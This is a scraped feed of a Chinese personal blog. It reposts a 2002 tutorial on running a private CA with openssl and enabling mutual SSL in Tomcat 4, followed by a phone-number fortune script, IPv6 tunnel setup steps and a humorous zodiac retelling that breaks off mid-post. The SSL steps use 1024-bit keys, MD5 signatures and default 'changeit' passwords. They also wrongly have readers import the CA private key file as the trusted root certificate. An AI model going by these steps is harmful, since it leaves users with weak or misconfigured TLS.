src="http://www.ibm.com/i/c.gif"  width="10" ></TD>  <TD>  <TABLE cellSpacing="0" cellPadding="0" width="150" border="0" >  <TBODY>  <TR>  <TD>文档选项</TD></TR></TABLE>  <TABLE cellSpacing="0" cellPadding="0" border="0" >  <TBODY>  <TR>  <TD width="150" >  <TABLE cellSpacing="0" cellPadding="0" width="143" border="0" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="1" alt=""  src="http://www.ibm.com/i/c.gif"  width="8" >   <TBODY>  <TR vAlign="top" >  <TD width="8" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="1" alt=""  src="http://www.ibm.com/i/c.gif"  width="8" ></TD>  <TD width="16" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="16" alt="将此页作为电子邮件发送" src="http://www.ibm.com/i/v14/icons/em.gif"  width="16" vspace="3" ></TD>  <TD width="122" >  <P><A rel="nofollow" href=";"  ><B><FONT color="#5c81a7" >将此页作为电子邮件发送</FONT></B></A></P></TD></TR></TABLE></TD></TR></TABLE><BR><BR></TD></TR></TABLE>  <P>级别： 初级</P>  <P><A rel="nofollow" href="http://www-128.ibm.com/developerworks/cn/security/se-tcssl/#author"  ><FONT color="#996699" >赵 梁</FONT></A> (<A rel="nofollow" href="mailto:b-i-d@163.com?subject=&#37197;&#32622;Tomcat 4&#20351;&#29992;SSL&amp;cc=b-i-d@163.com"  ><FONT color="#5c81a7" >b-i-d@163.com</FONT></A>)<BR><BR>  <TABLE border="1" >  <TBODY>  <TR>  <TD style="COLOR: #ff0000;"  >XML error: Please enter a value for the author element's jobtitle attribute, or the company-name element, or both.</TD></TR></TABLE><BR><BR><BR></P>  <P>2002 年 5 月 01 日</P>  <BLOCKQUOTE>目前介绍配置Tomcat 4使用单向SSL认证(只验证服务器证书)的资料很多，过程也比较简单。但是由于配置其使用双向SSL认证(还需要验证客户端个人证书)除了需要CA对证书签名外，还要从CA获得个人证书。有关这一问题，目前结合具体web服务器来讲解如何操作的资料很少。作者通过摸索借助一些SSL工具在本地实现了简单的CA功能，并在此基础上配置成功了Tomcat的双向认证，希望能把其中的一些经验与大家共享。不过受本人水平所限，文中难免会有错误与不当之处，敬请大家谅解。</BLOCKQUOTE>  <P><A rel="nofollow"><SPAN>Tomcat简介</SPAN></A></P>  <P>Tomcat是Apache Jakarta的子项目之一，作为一个优秀的开源web应用服务器，全面支持jsp1.2以及servlet2.3规范。因其技术先进、性能稳定，而且免费，因而深受Java爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的web应用服务器。</P><BR>  <TABLE cellSpacing="0" cellPadding="0" width="100%"  border="0" >  <TBODY>  <TR>  <TD><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="1" alt=""  src="http://www.ibm.com/i/v14/rules/blue_rule.gif"  width="100%"  ><BR><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="6" alt=""  src="http://www.ibm.com/i/c.gif"  width="8" border="0" ></TD></TR></TABLE>  <TABLE cellSpacing="0" cellPadding="0" align="right" >  <TBODY>  <TR align="right" >  <TD><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="4" alt=""  src="http://www.ibm.com/i/c.gif"  width="100%"  ><BR>  <TABLE cellSpacing="0" cellPadding="0" border="0" >  <TBODY>  <TR>  <TD vAlign="center" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="16" alt=""  src="http://www.ibm.com/i/v14/icons/u_bold.gif"  width="16" border="0" ><BR></TD>  <TD vAlign="top" align="right" ><A rel="nofollow" href="http://www-128.ibm.com/developerworks/cn/security/se-tcssl/#main"  ><B><FONT color="#996699" >回页首</FONT></B></A></TD></TR></TABLE></TD></TR></TABLE><BR><BR>  <P><A rel="nofollow"><SPAN>SSL(Server Socket Layer)简介</SPAN></A></P>  <P>在网络上信息在源-宿的传递过程中会经过其它的计算机。一般情况下，中间的计算机不会监听路过的信息。但在使用网上银行或者进行信用卡交易的时候有可能被监视，从而导致个人隐私的泄露。由于Internet和Intranet体系结构的原因，总有某些人能够读取并替换用户发出的信息。随着网上支付的不断发展，人们对信息安全的要求越来越高。因此Netscape公司提出了SSL协议，旨在达到在开放网络(Internet)上安全保密地传输信息的目的，这种协议在WEB上获得了广泛的应用。 之后IETF(www.ietf.org)对SSL作了标准化，即RFC2246，并将其称为TLS（Transport Layer Security），从技术上讲，TLS1.0与SSL3.0的差别非常微小。</P><BR>  <TABLE cellSpacing="0" cellPadding="0" width="100%"  border="0" >  <TBODY>  <TR>  <TD><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="1" alt=""  src="http://www.ibm.com/i/v14/rules/blue_rule.gif"  width="100%"  ><BR><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="6" alt=""  src="http://www.ibm.com/i/c.gif"  width="8" border="0" ></TD></TR></TABLE>  <TABLE cellSpacing="0" cellPadding="0" align="right" >  <TBODY>  <TR align="right" >  <TD><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="4" alt=""  src="http://www.ibm.com/i/c.gif"  width="100%"  ><BR>  <TABLE cellSpacing="0" cellPadding="0" border="0" >  <TBODY>  <TR>  <TD vAlign="center" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="16" alt=""  src="http://www.ibm.com/i/v14/icons/u_bold.gif"  width="16" border="0" ><BR></TD>  <TD vAlign="top" align="right" ><A rel="nofollow" href="http://www-128.ibm.com/developerworks/cn/security/se-tcssl/#main"  ><B><FONT color="#996699" >回页首</FONT></B></A></TD></TR></TABLE></TD></TR></TABLE><BR><BR>  <P><A rel="nofollow"><SPAN>SSL工作原理</SPAN></A></P>  <P>SSL协议使用不对称加密技术实现会话双方之间信息的安全传递。可以实现信息传递的保密性、完整性，并且会话双方能鉴别对方身份。不同于常用的http协议，我们在与网站建立SSL安全连接时使用https协议，即采用https://ip:port/的方式来访问。</P>  <P>当我们与一个网站建立https连接时，我们的浏览器与Web Server之间要经过一个握手的过程来完成身份鉴定与密钥交换，从而建立安全连接。具体过程如下：</P>  <OL>  <LI>用户浏览器将其SSL版本号、加密设置参数、与session有关的数据以及其它一些必要信息发送到服务器。   </LI><LI>服务器将其SSL版本号、加密设置参数、与session有关的数据以及其它一些必要信息发送给浏览器，同时发给浏览器的还有服务器的证书。如果配置服务器的SSL需要验证用户身份，还要发出请求要求浏览器提供用户证书。   </LI><LI>客户端检查服务器证书，如果检查失败，提示不能建立SSL连接。如果成功，那么继续。   </LI><LI>客户端浏览器为本次会话生成pre-master secret，并将其用服务器公钥加密后发送给服务器。   </LI><LI>如果服务器要求鉴别客户身份，客户端还要再对另外一些数据签名后并将其与客户端证书一起发送给服务器。   </LI><LI>如果服务器要求鉴别客户身份，则检查签署客户证书的CA是否可信。如果不在信任列表中，结束本次会话。如果检查通过，服务器用自己的私钥解密收到的pre-master secret，并用它通过某些算法生成本次会话的master secret。   </LI><LI>客户端与服务器均使用此master secret生成本次会话的会话密钥(对称密钥)。在双方SSL握手结束后传递任何消息均使用此会话密钥。这样做的主要原因是对称加密比非对称加密的运算量低一个数量级以上，能够显著提高双方会话时的运算速度。   </LI><LI>客户端通知服务器此后发送的消息都使用这个会话密钥进行加密。并通知服务器客户端已经完成本次SSL握手。   </LI><LI>服务器通知客户端此后发送的消息都使用这个会话密钥进行加密。并通知客户端服务器已经完成本次SSL握手。   </LI><LI>本次握手过程结束，会话已经建立。双方使用同一个会话密钥分别对发送以及接受的信息进行加、解密。 </LI></OL><BR>  <TABLE cellSpacing="0" cellPadding="0" width="100%"  border="0" >  <TBODY>  <TR>  <TD><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="1" alt=""  src="http://www.ibm.com/i/v14/rules/blue_rule.gif"  width="100%"  ><BR><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="6" alt=""  src="http://www.ibm.com/i/c.gif"  width="8" border="0" ></TD></TR></TABLE>  <TABLE cellSpacing="0" cellPadding="0" align="right" >  <TBODY>  <TR align="right" >  <TD><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="4" alt=""  src="http://www.ibm.com/i/c.gif"  width="100%"  ><BR>  <TABLE cellSpacing="0" cellPadding="0" border="0" >  <TBODY>  <TR>  <TD vAlign="center" ><IMG title="配置Tomcat支持SSL，并用openssl管理证书[转] - hankjin - 云水居"  height="16" alt=""  src="http://www.ibm.com/i/v14/icons/u_bold.gif"  width="16" border="0" ><BR></TD>  <TD vAlign="top" align="right" ><A rel="nofollow" href="http://www-128.ibm.com/developerworks/cn/security/se-tcssl/#main"  ><B><FONT color="#996699" >回页首</FONT></B></A></TD></TR></TABLE></TD></TR></TABLE><BR><BR>  <P><A rel="nofollow"><SPAN>配置Tomcat 4.x 使用SSL</SPAN></A></P>  <P>  </P><P><A rel="nofollow"><SPAN><STRONG>4.1 用到的软件包</STRONG></SPAN></A></P>  <P><STRONG></STRONG>  </P><UL>  <LI>Tomcat 4.0.2   <P>用途：Web Server。 <BR>下载： <A rel="nofollow" href="http://jakarta.apache.org/builds/jakarta-tomcat-4.0/release/v4.0.3/bin/"  ><FONT color="#5c81a7" >http://jakarta.apache.org/builds/jakarta-tomcat-4.0/release/v4.0.3/bin/</FONT></A> </P>  </LI><LI>JSSE 1.0,2   <P>用途：用来产生Tocmcat使用的秘钥对(keystore)。 <BR>下载： <A rel="nofollow" href="http://java.sun.com/products/jsse/"  ><FONT color="#5c81a7" >http://java.sun.com/products/jsse/</FONT></A> </P>  </LI><LI>Openssl 0.9.9.6   <P>用途：用来产生CA证书、签名并生成IE可导入的PKCS#12格式私钥。 <BR>下载： <A rel="nofollow" href="http://www.openssl.org/"  ><FONT color="#5c81a7" >http://www.openssl.org/</FONT></A> </P></LI></UL>  <P>以上工具的安装过程可以参考自带的帮助，本文就不再详细描述了。</P>  <P><A rel="nofollow"><SPAN><STRONG>4.2 建立自己的CA</STRONG></SPAN></A></P>  <P><STRONG></STRONG>  </P><P><STRONG>4.2.1 建立工作目录</STRONG> <BR><CODE>mkdir ca</CODE> </P>  <P><B>4.2.2 生成CA私钥以及自签名根证书</B> <BR><B>4.2.2.1 生成CA私钥</B> <BR><CODE>openssl genrsa -out ca\ca-key.pem 1024</CODE> </P>  <P><B>4.2.2.2 生成待签名证书</B> <BR><CODE>openssl req -new -out ca\ca-req.csr -key ca\ca-key.pem</CODE> </P>  <P><B>4.2.2.3 用CA私钥进行自签名</B> <BR><CODE>openssl x509 -req -in ca\ca-req.csr -out ca\ca-cert.pem -signkey ca\ca-key.pem -days 365</CODE> </P>  <P><A rel="nofollow"><SPAN><STRONG>4.3 设置Tomcat 4.x</STRONG></SPAN></A></P>  <P><STRONG></STRONG>  </P><P>在本文中用符号"%JDK_HOME%"来表示JDK的安装位置，用符号"%TCAT_HOME%" 表示Tomcat的安装位置。</P>  <P><B>4.3.1建立工作目录</B> <BR><CODE>mkdir server</CODE> </P>  <P><B>4.3.2 生成server端证书</B> <BR>4.3.2.1 生成KeyPair <BR><CODE>%JDK_HOME%\bin\keytool -genkey -alias tomcat_server -validity 365 -keyalg RSA -keysize 1024 -keypass changeit -storepass changeit -dname "cn=localhost, ou=department, o=company, l=Beijing, st=Beijing, c=CN" -keystore server\server_keystore</CODE> </P>  <P>4.3.2.2 生成待签名证书 <BR><CODE>%JDK_HOME%\bin\keytool -certreq -alias tomcat_server -sigalg MD5withRSA -file server\server.csr -keypass changeit -keystore server\server_keystore -storepass changeit</CODE> </P>  <P>4.3.2.3 用CA私钥进行签名 <BR><CODE>openssl x509 -req -in server\server.csr -out server\server-cert.pem -CA ca\ca-cert.pem -CAkey ca\ca-key.pem -days 365</CODE> </P>  <P>4.3.2.4 导入信任的CA根证书到JSSE的默认位置(%JDK_ROOT %/jre/security/cacerts) <BR><CODE>%JDK_HOME%\bin\keytool -import -v -trustcacerts -storepass changeit -alias my_ca_root -file ca\ca-cert.pem -keystore %JDK_HOME%\jre\lib\security\cacerts</CODE> </P>  <P>4.3.2.5 把CA签名后的server端证书导入keystore <BR><CODE>%JDK_HOME%\bin\keytool -import -v -trustcacerts -storepass changeit -alias tomcat_server -file server\server-cert.pem -keystore server\server_keystore</CODE> </P>  <P>4.3.2.6 查看server端证书 <BR><CODE>keytool -list -keystore %JDK_HOME%\jre\lib\security\cacerts keytool -list -keystore server\server_keystore</CODE> </P>  <P>4.3.3 修改server.xml使Tomcat支持SSL <BR>首先找到以下内容，去掉对其的注释。然后参照红色部分修改。如果配置Tomcat不验证客户身份，可以设置clientAuth="false"。 </P>  <P>  <TABLE cellSpacing="0" cellPadding="0" width="100%"  border="0" >  <TBODY>  <TR>  <TD><PRE>&lt;Connector className="org.apache.catalina.connector.http.HttpConnector"             port="8443" minProcessors="5" maxProcessors="75"             enableLookups="true"             acceptCount="10" debug="0" scheme="https" secure="true"&gt;  &lt;Factory className="org.apache.catalina.net.SSLServerSocketFactory"             clientAuth="true" protocol="TLS"  keystoreFile="%TCAT_HOME%/conf/server_keystore" keystorePass="changeit"             /&gt;  </PRE></TD></TR></TABLE><BR>然后把文件server\server_keystore复制到目录%TCAT_HOME%\conf\下。 </P>  <P><A rel="nofollow"><SPAN><STRONG>4.4 在IE中安装个人证书</STRONG></SPAN></A></P>  <P><STRONG>4.4.1 建立工作目录</STRONG> <BR><CODE>mkdir client</CODE> </P>  <P><B>4.4.2 生成client私钥并用CA私钥签名</B> </P>  <P>4.4.2.1 生成client私钥 <BR><CODE>openssl genrsa -out client\client-key.pem 1024</CODE> </P>  <P>4.4.2.2 生成待签名证书 <BR><CODE>openssl req -new -out client\client-req.csr -key client\client-key.pem</CODE> </P>  <P>4.4.2.3 用CA私钥进行签名 <BR><CODE>openssl x509 -req -in client\client-req.csr -out client\client.crt -signkey client\client-key.pem -CA ca\ca-cert.pem -CAkey ca\ca-key.pem -CAcreateserial -days 365</CODE> </P>  <P>4.4.2.4 生成client端的个人证书 <BR>因为JSSE1.0.2没有完全实现了对PKCS#12格式文件的操作(只能读取，不能输出)，所以在这里需要用openssl制作client端的个人证书(包含私钥)。 <BR><CODE>openssl pkcs12 -export -clcerts -in client\client.crt -inkey client\client-key.pem -out client\client.p12</CODE> </P>  <P>4.4.2.5 安装信任的根证书 <BR>把ca\ca-key.pem改名为ca\ca-key.cer，在client端的IE中使用"工具 ' Internet选项 ' 内容 ' 证书 ' 导入"把我们生成的CA根证书导入，使其成为用户信任的CA。 </P>  <P><B>4.4.3 安装个人证书</B> <BR>把client.p12导入到client端的IE中作为个人证书，导入过程同4.4.2.5。 </P>  <P><A rel="nofollow"><SPAN><STRONG>4.5 用IE浏览器使用SSL协议访问Tomcat</STRONG></SPAN></A></P>  <P><STRONG></STRONG>  </P><P><STRONG>4.5.1 启动Tomcat 4.x</STRONG> <BR>执行%TCAT_HOME%\bin\startup.bat启动Tomcat 4.x </P>  <P><B>4.5.2 用IE访问Tomcat 4.x</B> <BR>在IE浏览器的地址栏中输入https://localhost:8443，如果前面的操作都正确的话，应该可以看到Tomcat的欢迎页面。同时状态栏上的小锁处于闭合状态，表示您已经成功地与服务器建立了要求客户端验证的SSL安全连接</P></TD></TR></TABLE>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2EE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007101743831516/</guid>
    </item>
    <item>
      <title>
<![CDATA[手机号算吉凶]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720102221443506/</link>
      <description>
<![CDATA[<div><span style="font-family: Helvetica, Arial, sans-serif; line-height: 16px; font-size: 12px; color: rgb(51, 51, 51); "><pre><span style="font-size: medium;"><font color="#FFFFFF">手机号算吉凶，本地html版。直接保存成html文件即可
&lt;script src='http://ajax.googleapis.com/ajax/libs/jquery/1.3.1/jquery.min.js'&gt;&lt;/script&gt;
 &lt;script language="javas<wbr>cript"&gt;
var fate=new Array();
fate["0"]=" 最极之数，还本归元，能得繁荣，发达成功 吉";
fate["1"]=" 大展鸿图，信用得固，名利双收，可获成功 吉";
fate["10"]=" 乌云遮月，暗淡无光，空费心力，徒劳无功 凶";
fate["11"]=" 草木逢春，枝叶沾露，稳健着实，必得人望 吉";
fate["12"]=" 薄弱无力，孤立无援，外祥内苦，谋事难成 凶";
fate["13"]=" 天赋吉运，能得人望，善用智慧，必获成功 吉";
fate["14"]=" 忍得若难，必有后福，是成是败，惟靠紧毅 凶";
fate["15"]=" 谦恭做事，外得人和，大事成就，一门兴隆 吉";
fate["16"]=" 能获众望，成就大业，名利双收，盟主四方 吉";
fate["17"]=" 排除万难，有贵人助，把握时机，可得成功 吉";
fate["18"]=" 经商做事，顺利昌隆，如能慎始，百事亨通 吉";
fate["19"]=" 成功虽早，慎防亏空，内外不合，障碍重重 凶";
fate["2"]=" 根基不固，摇摇欲坠，一盛一衰，劳而无获 凶";
fate["20"]=" 智商志大，历尽艰难，焦心忧劳，进得两难 凶";
fate["21"]=" 先历困苦，后得幸福，霜雪梅花，春来怒放 吉";
fate["22"]=" 秋草逢霜，怀才不遇，忧愁怨苦，事不如意 凶";
fate["23"]=" 旭日升天，名显四方，渐次进展，终成大业 吉";
fate["24"]=" 绵绣前程，须靠自力，多用智谋，能奏大功 吉";
fate["25"]=" 天时地利，只欠人和，讲信修睦，即可成功 吉";
fate["26"]=" 波澜起伏，千变万化，凌架万难，必可成功 凶";
fate["27"]=" 一成一败，一盛一衰，惟靠谨慎，可守成功 凶带吉";
fate["28"]=" 鱼临旱地，难逃恶运，此数大凶，不如更名 凶";
fate["29"]=" 如龙得云，青云直上，智谋奋进，才略奏功 吉";
fate["3"]=" 根深蒂固，蒸蒸日上，如意吉祥，百事顺遂 吉";
fate["30"]=" 吉凶参半，得失相伴，投机取巧，吉凶无常 凶";
fate["31"]=" 此数大吉，名利双收，渐进向上，大业成就 吉";
fate["32"]=" 池中之龙，风云际会，一跃上天，成功可望 吉";
fate["33"]=" 意气用事，人和必失，如能慎始，必可昌隆 吉";
fate["34"]=" 灾难不绝，难望成功，此数大凶，不如更名 凶";
fate["35"]=" 中吉之数，进退保守，生意安稳，成就普通 吉";
fate["36"]=" 波澜得叠，常陷穷困，动不如静，有才无命 凶";
fate["37"]=" 逢凶化吉，吉人天相，风调雨顺，生意兴隆 吉";
fate["38"]=" 名虽可得，利则难获，艺界发展，可望成功 凶带吉";
fate["39"]=" 云开见月，虽有劳碌，光明坦途，指日可望 吉";
fate["4"]=" 前途坎坷，苦难折磨，非有毅力，难望成功 凶";
fate["40"]=" 一成一衰，沉浮不定，知难而退，自获天佑 吉带凶";
fate["41"]=" 天赋吉运，德望兼备，继续努力，前途无限 吉";
fate["42"]=" 事业不专，十九不成，专心进取，可望成功 吉带凶";
fate["43"]=" 雨夜之花，外祥内苦，忍耐自重，转凶为吉 吉带凶";
fate["44"]=" 虽用心计，事难遂愿，贪功冒进，必招失败 凶";
fate["45"]=" 杨柳遇春，绿叶发枝，冲破难关，一举成名 吉";
fate["46"]=" 坎坷不平，艰难重重，若无耐心，难望有成 凶";
fate["47"]=" 有贵人助，可成大业，虽遇不幸，浮沉不定 吉";
fate["48"]=" 美化丰实，鹤立鸡群，名利俱全，繁荣富贵 吉";
fate["49"]=" 遇吉则吉，遇凶则凶，惟靠谨慎，逢凶化吉 凶";
fate["5"]=" 阴阳和合，生意兴隆，名利双收，后福重重 吉";
fate["50"]=" 吉凶互见，一成一败，凶中有吉，吉中有凶 吉带凶";
fate["51"]=" 一盛一衰，浮沉不常，自重自处，可保平安 吉带凶";
fate["52"]=" 草木逢春，雨过天晴，渡过难关，即得成功 吉";
fate["53"]=" 盛衰参半，外祥内苦，先吉后凶，先凶后吉 吉带凶";
fate["54"]=" 虽倾全力，难望成功，此数大凶，最好改名 凶";
fate["55"]=" 外观昌隆，内隐祸患，克服难关，开出泰运 吉带凶";
fate["56"]=" 事与愿违，终难成功，欲速不达，有始无终 凶";
fate["57"]=" 虽有困难，时来运转，旷野枯草，春来花开 吉";
fate["58"]=" 半凶半吉，浮沉多端，始凶终吉，能保成功 凶带吉";
fate["59"]=" 遇事猜疑，难望成事，大刀阔斧，始可有成 凶";
fate["6"]=" 万宝集门，天降幸运，立志奋发，得成大功 吉";
fate["60"]=" 黑暗无光，心迷意乱，出尔反尔，难定方针 凶";
fate["61"]=" 运遮半月，内隐风波，应有谨慎，始保平安 吉带凶";
fate["62"]=" 烦闷懊恼，事业难展，自防灾祸，始免困境 凶";
fate["63"]=" 万物化育，繁荣之象，专心一意，必能成功 吉";
fate["64"]=" 见异思迁，十九不成，徒劳无功，不如更名 凶";
fate["65"]=" 吉运自来，能享盛名，把握时机，必获成功 吉";
fate["66"]=" 黑夜温长，进退维谷，内外不和，信用缺乏 凶";
fate["67"]=" 独营事业，事事如意，功成名就，富贵自来 吉";
fate["68"]=" 思虎虑周祥，计书力行，不失先机，可望成功 吉";
fate["69"]=" 动摇不安，常陷逆境，不得时运，难得利润 凶";
fate["7"]=" 独营生意，和气吉祥，排除万难，必获成功 吉";
fate["70"]=" 惨淡经营，难免贫困，此数不吉，最好改名 凶";
fate["71"]=" 吉凶参半，惟赖勇气，贯彻力行，始可成功 吉带凶";
fate["72"]=" 利害混集，凶多吉少，得而复失，难以安顺 凶";
fate["73"]=" 安乐自来，自然吉祥，力行不懈，终必成功 吉";
fate["74"]=" 利不及费，坐食山空，如无章法，难望成功 凶";
fate["75"]=" 吉中带凶，欲速不达，进不如守，可保安祥 吉带凶";
fate["76"]=" 此数大凶，破产之象，宜速改名，以避厄运 凶";
fate["77"]=" 先苦后甘，先甜后苦，如能守成，不致失败 吉带凶";
fate["78"]=" 有得有失，华而不实，须防劫财，始保安顺 吉带凶";
fate["79"]=" 如走夜路，前途无光，希望不大，劳而无功 凶";
fate["8"]=" 努力发达，贯彻志望，不忘进退，可望成功 吉";
fate["80"]=" 得而复失，枉费心机，守成无贪，可保安稳 吉带凶";
fate["9"]=" 虽抱奇才，有才无命，独营无力，财力难望 凶";


 function divine(phone){
  phone=phone.toString().substr(4,8);
  phone=Number(phone);
  phone=phone/80;
  temp=parseInt(phone);
  phone=phone-temp;
  phone=parseInt(phone*80);
  phone=phone.toString()
  $("#fate").html(fate[phone]);
 }
 $(document).ready(function(){
  $("#divine").click(function(){
   divine($("#phone").val());
  })
 });
 &lt;/script&gt;
 &lt;input type="text" id="phone"&gt;
 &lt;input type="button" id="divine" value="Go!"&gt;
 &lt;br/&gt;
 &lt;div style="color:green" id="fate"/&gt;</font></span>
</pre></span></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720102221443506/</guid>
    </item>
    <item>
      <title>
<![CDATA[Linux使用IPv6]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010620102816849/</link>
      <description>
<![CDATA[<P>下载软件</P>  <P>wget <A rel="nofollow" href="http://gogo6.com/downloads/gogoc-1_2-RELEASE.tar.gz"  >http://gogo6.com/downloads/gogoc-1_2-RELEASE.tar.gz</A></P>  <P>tar xf gogoc-1_2-RELEASE.tar.gz</P>  <P>cd gogoc-1_2-RELEASE</P>  <P>make</P>  <P>cd gogoc-tsp/bin</P>  <P>mv gogoc.conf.sample gogoc.conf</P>  <P>sudo ./gogoc</P>  <P>如果出现错误Failed to contact TSP listener at anonymous.freenet6.net，等一会儿就好了</P>  <P><A rel="nofollow" href="mailto:hankjin@jnfdaj:~/bin$"  >hankjin@jnfdaj:~/bin$</A> sudo ./gogoc<BR>gogoCLIENT v1.2-RELEASE build Jul 20 2010-21:49:19<BR>Built on ///Linux jnfdaj 2.6.27-17-server #1 SMP Fri Mar 12 04:04:33 UTC 2010 i686 GNU/Linux///<BR>Failed to contact TSP listener at anonymous.freenet6.net.<BR>Disconnected. Retrying.<BR>Failed to connect to server anonymous.freenet6.net on port 3653.<BR>Disconnected. Retrying in 30 seconds.<BR>Failed to contact TSP listener at anonymous.freenet6.net.<BR>Disconnected. Retrying.<BR>Failed to connect to server anonymous.freenet6.net on port 3653.<BR>Disconnected. Retrying in 30 seconds.<BR>Failed to contact TSP listener at anonymous.freenet6.net.<BR>Disconnected. Retrying.<BR>Failed to connect to server anonymous.freenet6.net on port 3653.<BR>Disconnected. Retrying in 30 seconds.<BR>Failed to contact TSP listener at anonymous.freenet6.net.<BR>Disconnected. Retrying.<BR>Failed to connect to server anonymous.freenet6.net on port 3653.<BR>Disconnected. Retrying in 30 seconds.<BR>Failed to contact TSP listener at anonymous.freenet6.net.<BR>Disconnected. Retrying.<BR>Failed to connect to server anonymous.freenet6.net on port 3653.<BR>Disconnected. Retrying in 30 seconds.<BR>Received a TSP redirection message from server anonymous.freenet6.net (1200 Redi).ction<BR>The server redirection list is [ anon-amsterdam.freenet6.net, anon-taipei.freenet6.net, anon-montreal.freenet6.net ].<BR>The optimized server redirection list is [ anon-taipei.freenet6.net, anon-montreal.freenet6.net, anon-amsterdam.freenet6.net ].<BR><A rel="nofollow" href="mailto:hankjin@jnfdaj:~/bin$"  >hankjin@jnfdaj:~/bin$</A><BR></P>  <P>访问六维空间</P>  <P><A rel="nofollow" href="http://bt.neu6.edu.cn/"  >http://bt.neu6.edu.cn/</A></P>  <P><BR>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010620102816849/</guid>
    </item>
    <item>
      <title>
<![CDATA[水煮十二星座的起源]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201313105057288/</link>
      <description>
<![CDATA[毁三观的章回体。前六个是宙斯的情史，后六篇是关于逃跑的<div>第一回，小三教坏宙斯</div><div>第二回，宙斯引诱公主</div><div>第三回，宙斯引诱王妃</div><div>第四回，宙斯引诱姑娘</div><div>第五回，宙斯引诱姑娘2</div><div>第六回，宙斯和女神</div><div>第七回，组团逃跑</div><div>第八回，不跑找死</div><div>第九回，不会跑死</div><div>第十回，<span style="line-height: 22px;"  >狼狈地</span><span style="line-height: 22px;"  >跑</span></div><div>十一回，聪明地跑</div><div>十二回，<span style="line-height: 22px;"  >傲</span><span style="line-height: 22px;"  >娇</span>地跑</div><div><div style="line-height: 22px;"  >这是个毁三观的水煮，如有雷同，实属巧合</div><div style="line-height: 22px;"  >第一回，小三教坏宙斯</div><div style="line-height: 22px;"  >很久很久之前，国王王后王子公主，一家四口快乐的生活；一个小三赶走了王后谋害王子，宙斯应王后的请求，命黄金牧羊去拯救，倒霉催的牧羊把公主掉海里了，一边回头看公主，一边保护王子，牧羊座。</div><div style="line-height: 22px;"  >第二回，宙斯引诱公主</div><div style="line-height: 22px;"  >宙斯被小三的故事教坏了，变成一只温顺的牛，骗公主骑上之后，一路狂奔，抢了公主回家成亲了，此牛为金牛座</div><div style="line-height: 22px;"  >第三回，宙斯引诱王妃</div><div style="line-height: 22px;"  >宙斯又变成一只鹅引诱了一个王妃并生了两个儿子，一个跟人打架被砍死了，另一个想同年同月死却有不死之身，宙斯就给哥俩设立了双子座</div><div style="line-height: 22px;"  >第四回，宙斯引诱姑娘</div><div style="line-height: 22px;"  >宙斯又引诱了一个姑娘，生了个儿子海格拉斯(这si和三个星座有关系), 宙斯老婆终于发飙了，用咒语让海格<span style="line-height: 22px;"  >拉斯</span><span style="line-height: 22px;"  >杀了自己的老婆，宙斯不敢怪老婆，只能让海格</span><span style="line-height: 22px;"  >拉斯</span><span style="line-height: 22px;"  >打怪升职作为补偿，在打蛇怪时一只蝎子出来帮蛇怪，被海格</span><span style="line-height: 22px;"  >拉斯</span><span style="line-height: 22px;"  >踩死了，宙斯老婆要纪念蝎子，设巨蝎座</span></div><div style="line-height: 22px;"  >第五回，宙斯引诱姑娘2</div><div style="line-height: 22px;"  >除了上回的蛇怪，海格还把一只狮子打怕了，宙斯老婆给这只懦弱的狮子立了个狮子座</div><div style="line-height: 22px;"  >第六回，宙斯和女神</div><div style="line-height: 22px;"  >宙斯还和农业女神有一个女儿，被冥王抢去了，农业女神严重抗议促使宙斯和冥王谈判。最后达成的协议是：女孩在在冬天留在冥界；作为补偿，农业女神成为处女座。</div><div style="line-height: 22px;"  ><span style="line-height: 22px;"  ><br></span></div><div style="line-height: 22px;"  ><span style="line-height: 22px;"  >第七回，组团逃跑</span></div><div style="line-height: 22px;"  >正义女神用天秤判断人类的善恶，后来人都堕落了，神都逃跑了，只剩下天秤挂在天上，曰抬头三尺有神明，天秤座</div><div style="line-height: 22px;"  >第八回，不跑找死</div><div style="line-height: 22px;"  >海神的儿子，跟李元霸一样很2地说老子天下第一，结果李元霸被雷劈死了，海神的儿子被宙斯老婆派了另一只蝎子毒死了，为了表彰这只成功的蝎子，设立天蝎座</div><div style="line-height: 22px;"  >第九回，不会跑死</div><div style="line-height: 22px;"  >又是海格拉斯，他有个半人半马族的不死之身的老师，海格跟人打架时射箭，这个老师没有别人会跑，结果只有他被射中了，普罗米修斯落井下石或者成人之美地废了不死之身，这倒霉老师就成了射手座</div><div style="line-height: 22px;"  >第十回，<span style="line-height: 22px;"  >狼狈地</span><span style="line-height: 22px;"  >跑</span></div><div><span style="line-height: 22px;"  >有个擅长K歌的长得像山羊的</span>牧<span style="line-height: 22px;"  >神，有次众神唱K遇见妖怪作乱，一帮无节操的全跑了，</span>牧神狼狈地从水路跑，慌得只把下半身变成了鱼，上半身还是山羊，后来大家就设了个摩羯座</div><div 